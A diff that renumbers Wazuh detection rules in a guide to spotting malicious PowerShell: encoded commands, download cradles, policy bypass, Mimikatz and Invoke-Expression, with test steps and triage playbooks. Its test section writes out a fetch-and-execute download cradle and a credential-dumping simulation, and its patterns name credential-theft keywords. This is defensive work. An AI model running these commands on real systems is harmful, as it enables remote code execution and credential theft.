@@ -14,9 +14,9 @@ Detects malicious PowerShell usage including encoded commands, download cradles,
 
 ## Detection Rules
 
-### Rule 100010: Encoded PowerShell Commands
+### Rule 200010: Encoded PowerShell Commands
 ```xml
-<rule id="100010" level="12">
+<rule id="200010" level="12">
   <if_sid>60009</if_sid>
   <field name="win.eventdata.scriptBlockText" type="pcre2">(?i)-enc.*|encodedcommand|frombase64string</field>
   <description>Encoded PowerShell command detected (obfuscation)</description>
@@ -32,9 +32,9 @@ Detects malicious PowerShell usage including encoded commands, download cradles,
 
 **Severity**: High (12)
 
-### Rule 100011: PowerShell Download Cradle
+### Rule 200011: PowerShell Download Cradle
 ```xml
-<rule id="100011" level="12">
+<rule id="200011" level="12">
   <if_sid>60009</if_sid>
   <field name="win.eventdata.scriptBlockText" type="pcre2">(?i)iex.*downloadstring|invoke-webrequest.*iex|iwr.*iex|curl.*iex|wget.*iex</field>
   <description>PowerShell download cradle detected (remote code execution)</description>
@@ -50,9 +50,9 @@ Detects malicious PowerShell usage including encoded commands, download cradles,
 
 **Severity**: High (12)
 
-### Rule 100012: Execution Policy Bypass
+### Rule 200012: Execution Policy Bypass
 ```xml
-<rule id="100012" level="10">
+<rule id="200012" level="10">
   <if_sid>60009</if_sid>
   <field name="win.eventdata.scriptBlockText" type="pcre2">(?i)-executionpolicy\s+(bypass|unrestricted)</field>
   <description>PowerShell execution policy bypass detected</description>
@@ -67,9 +67,9 @@ Detects malicious PowerShell usage including encoded commands, download cradles,
 
 **Severity**: Medium-High (10)
 
-### Rule 100013: Mimikatz Detection
+### Rule 200013: Mimikatz Detection
 ```xml
-<rule id="100013" level="15">
+<rule id="200013" level="15">
   <if_sid>60009</if_sid>
   <field name="win.eventdata.scriptBlockText" type="pcre2">(?i)mimikatz|invoke-mimikatz|dumpcreds|sekurlsa|kerberos::golden</field>
   <description>Mimikatz credential dumping tool detected (CRITICAL)</description>
@@ -85,9 +85,9 @@ Detects malicious PowerShell usage including encoded commands, download cradles,
 
 **Severity**: Critical (15)
 
-### Rule 100014: Invoke-Expression Patterns
+### Rule 200014: Invoke-Expression Patterns
 ```xml
-<rule id="100014" level="10">
+<rule id="200014" level="10">
   <if_sid>60009</if_sid>
   <field name="win.eventdata.scriptBlockText" type="pcre2">(?i)invoke-expression|iex\s+\(</field>
   <description>PowerShell Invoke-Expression detected (potential code injection)</description>
@@ -133,7 +133,7 @@ Windows PowerShell > Turn on PowerShell Script Block Logging
 
 ## Testing Procedures
 
-### Test 1: Encoded Command Detection (Rule 100010)
+### Test 1: Encoded Command Detection (Rule 200010)
 ```powershell
 # On Windows endpoint (SAFE - just runs Write-Host)
 # Encode a benign command
@@ -144,26 +144,26 @@ $encodedCommand = [Convert]::ToBase64String($bytes)
 # Execute encoded command
 powershell.exe -EncodedCommand $encodedCommand
 
-# Expected: Rule 100010 alert in Wazuh
+# Expected: Rule 200010 alert in Wazuh
 ```
 
-### Test 2: Download Cradle Detection (Rule 100011)
+### Test 2: Download Cradle Detection (Rule 200011)
 ```powershell
 # SAFE test - downloads benign content
 IEX (New-Object Net.WebClient).DownloadString('https://example.com')
 
-# Expected: Rule 100011 alert
+# Expected: Rule 200011 alert
 ```
 
-### Test 3: Execution Policy Bypass (Rule 100012)
+### Test 3: Execution Policy Bypass (Rule 200012)
 ```powershell
 # From command prompt
 powershell.exe -ExecutionPolicy Bypass -Command "Write-Host 'Test'"
 
-# Expected: Rule 100012 alert
+# Expected: Rule 200012 alert
 ```
 
-### Test 4: Mimikatz Simulation (Rule 100013)
+### Test 4: Mimikatz Simulation (Rule 200013)
 ```powershell
 # SAFE - just contains the keyword, doesn't run actual Mimikatz
 Write-Host "Testing mimikatz detection"
@@ -171,7 +171,7 @@ Write-Host "Testing mimikatz detection"
 # Or use Atomic Red Team
 Invoke-AtomicTest T1003.001 -TestNumbers 1
 
-# Expected: Rule 100013 alert
+# Expected: Rule 200013 alert
 ```
 
 ### Verification
@@ -200,7 +200,7 @@ Invoke-Command -ComputerName Server01 -Credential $cred -ScriptBlock {...}
 **Tuning**:
 ```xml
 <!-- Whitelist specific admin accounts -->
-<rule id="100010" level="12">
+<rule id="200010" level="12">
   <if_sid>60009</if_sid>
   <field name="win.eventdata.scriptBlockText" type="pcre2">(?i)-enc.*|encodedcommand</field>
   <field name="win.system.computer" negate="yes">ADMIN-WORKSTATION</field>
@@ -213,7 +213,7 @@ Invoke-Command -ComputerName Server01 -Credential $cred -ScriptBlock {...}
 
 **Tuning**: Whitelist known software paths
 ```xml
-<rule id="100011" level="12">
+<rule id="200011" level="12">
   <if_sid>60009</if_sid>
   <field name="win.eventdata.scriptBlockText" type="pcre2">iex.*downloadstring</field>
   <field name="win.eventdata.path" negate="yes">C:\\Program Files\\TrustedApp</field>
@@ -227,7 +227,7 @@ Invoke-Command -ComputerName Server01 -Credential $cred -ScriptBlock {...}
 **Tuning**: Whitelist security tool processes
 ```xml
 <!-- Exclude known security tools -->
-<rule id="100014" level="10">
+<rule id="200014" level="10">
   <if_sid>60009</if_sid>
   <field name="win.eventdata.parentImage" negate="yes" type="pcre2">CrowdStrike|SentinelOne|Defender</field>
   <description>Invoke-Expression detected</description>
@@ -238,7 +238,7 @@ Invoke-Command -ComputerName Server01 -Credential $cred -ScriptBlock {...}
 
 ### Tier 1 Analyst Actions
 
-#### For Rules 100010-100012 (Encoded/Download/Bypass)
+#### For Rules 200010-200012 (Encoded/Download/Bypass)
 1. **Immediate triage**
    - Check user account: Is it a privileged user?
    - Check hostname: Is it a server or workstation?
@@ -259,7 +259,7 @@ Invoke-Command -ComputerName Server01 -Credential $cred -ScriptBlock {...}
    - Disable user account
    - Escalate to Tier 2
 
-#### For Rule 100013 (Mimikatz - CRITICAL)
+#### For Rule 200013 (Mimikatz - CRITICAL)
 1. **IMMEDIATE ESCALATION** - This is a critical incident
 2. **Do NOT wait** - Isolate system immediately
 3. **Notify Incident Commander**
@@ -312,7 +312,7 @@ Get-NetTCPConnection | Where-Object {$_.OwningProcess -in (Get-Process powershel
 ### Correlation Rule (Multiple PowerShell Techniques)
 ```xml
 <!-- Alert if 3+ different PowerShell techniques in 10 minutes -->
-<rule id="100015" level="15" frequency="3" timeframe="600">
+<rule id="200015" level="15" frequency="3" timeframe="600">
   <if_matched_group>powershell</if_matched_group>
   <description>Multiple PowerShell attack techniques detected (CRITICAL)</description>
   <mitre>
